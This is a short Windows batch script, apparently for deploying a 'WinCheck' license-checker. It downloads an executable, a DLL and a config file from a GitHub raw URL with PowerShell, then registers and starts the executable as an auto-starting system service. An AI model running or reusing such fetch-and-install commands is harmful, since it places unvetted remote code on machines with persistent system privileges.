start /wait c:\windows\system32\net stop WinCheck
start /wait c:\windows\system32\sc delete WinCheck
start /wait powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/altinsoft/public-repo/main/wincheck.exe -OutFile C:\Windows\Setup\LicenseChecker\wincheck.exe"
start /wait powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/altinsoft/public-repo/main/System.CodeDom.dll -OutFile C:\Windows\Setup\LicenseChecker\System.CodeDom.dll"
start /wait powershell.exe -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/altinsoft/public-repo/main/WindowsLicenseChecker.exe.config -OutFile C:\Windows\Setup\LicenseChecker\WindowsLicenseChecker.exe.config"
start /wait c:\windows\system32\sc CREATE "WinCheck" binpath= "C:\Windows\Setup\LicenseChecker\wincheck.exe
sc config WinCheck start=auto
start /wait c:\windows\system32\net start WinCheck
